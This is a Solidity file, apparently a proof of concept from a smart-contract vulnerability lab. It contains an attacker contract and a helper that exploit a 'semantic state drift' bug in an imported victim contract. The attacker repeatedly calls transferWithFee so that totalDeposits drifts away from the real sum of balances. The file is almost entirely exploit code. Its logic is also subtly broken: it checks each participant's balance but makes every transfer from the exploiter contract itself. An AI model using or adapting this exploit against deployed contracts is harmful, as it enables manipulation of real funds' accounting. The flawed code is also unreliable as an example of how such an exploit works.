// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// Attacker Contract: Semantic State Drift Exploiter
// This contract exploits the semantic state drift vulnerability

import "./Semantic_State_Drift_Victim.sol";

contract SemanticStateDriftExploiter {
    SemanticStateDriftVictim public victim;
    
    event ExploitStarted(address indexed attacker);
    event DriftCreated(uint256 totalDepositsBefore, uint256 totalDepositsAfter, uint256 actualSum);
    event ExploitCompleted(uint256 driftAmount);
    
    constructor(address _victim) {
        victim = SemanticStateDriftVictim(payable(_victim));
    }
    
    // Exploit the semantic drift by repeatedly calling transferWithFee with fees
    function exploitDrift(address[] calldata participants, uint256 numIterations) external {
        emit ExploitStarted(msg.sender);
        
        // Record initial state
        uint256 initialTotalDeposits = victim.totalDeposits();
        
        // Perform multiple transfers with fees to create drift
        for (uint256 i = 0; i < numIterations; i++) {
            // Transfer between participants with a fee
            // This will deduct fees from balances but NOT from totalDeposits
            address from = participants[i % participants.length];
            address to = participants[(i + 1) % participants.length];
            
            uint256 balance = victim.balances(from);
            if (balance > 100) {
                // Transfer a small amount with a fee
                // The fee creates the drift
                victim.transferWithFee(to, 50, 10);
            }
        }
        
        // Calculate the drift
        uint256 finalTotalDeposits = victim.totalDeposits();
        uint256 actualSum = victim.computeSum(participants);
        
        emit DriftCreated(initialTotalDeposits, finalTotalDeposits, actualSum);
        emit ExploitCompleted(finalTotalDeposits - actualSum);
    }
    
    // Demonstrate the drift by showing the mismatch
    function demonstrateDrift(address[] calldata participants) external view returns (
        uint256 reportedTotal,
        uint256 actualSum,
        uint256 drift
    ) {
        reportedTotal = victim.totalDeposits();
        actualSum = victim.computeSum(participants);
        drift = reportedTotal > actualSum ? reportedTotal - actualSum : 0;
        return (reportedTotal, actualSum, drift);
    }
}

// Helper contract to simulate multiple users
contract SemanticDriftHelper {
    SemanticStateDriftVictim public victim;
    
    constructor(address _victim) {
        victim = SemanticStateDriftVictim(payable(_victim));
    }
    
    // Receive initial balance
    function fundMe() external payable {}
    
    // Deposit into victim contract
    function depositToVictim() external payable {
        victim.deposit{value: msg.value}();
    }
    
    // Transfer with fee (creates drift)
    function transferWithFee(address to, uint256 amount, uint256 fee) external {
        victim.transferWithFee(to, amount, fee);
    }
    
    // Check balance
    function getBalance() external view returns (uint256) {
        return victim.balances(address(this));
    }
    
    // Allow contract to receive ETH
    receive() external payable {}
}
